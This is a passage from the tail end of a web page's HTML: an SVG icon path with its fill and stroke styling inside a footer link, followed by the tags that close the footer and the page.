       d="M 80.03,122.66 C 94.49,107.06 104.32,113.99 87.53,124.89 C 82.19,128.36 83.58,129.37 87.17,128.82 C 92.24,128.05 95.01,129.02 96.24,129.98 C 99.18,132.28 100.65,130.57 101.64,128.82 C 103.61,125.35 110.25,129.12 105.39,132.75 C 101.59,135.58 102.12,138.77 105.57,140.61 C 111.96,144.01 126.30,150.75 124.14,157.93 C 123.26,160.86 121.67,163.62 118.07,159.89 C 111.32,152.92 106.83,146.97 91.28,144.54 C 81.24,142.96 71.15,140.33 61.46,145.25 C 56.90,147.67 51.16,149.23 49.94,146.37 C 48.35,142.64 56.47,139.57 64.32,138.82 C 69.42,138.33 73.99,134.99 67.00,133.29 C 58.39,130.64 68.28,123.09 74.50,124.89 C 78.55,126.07 78.95,123.83 80.03,122.66 z"
       style="fill:#ffffff;stroke:#356ace;stroke-width:1.5;" />
  </g>
</svg>
</span></a>

          </li>
          
        </ul>
      </div>

    </div>

  </div>

</footer>


  </body>

</html>
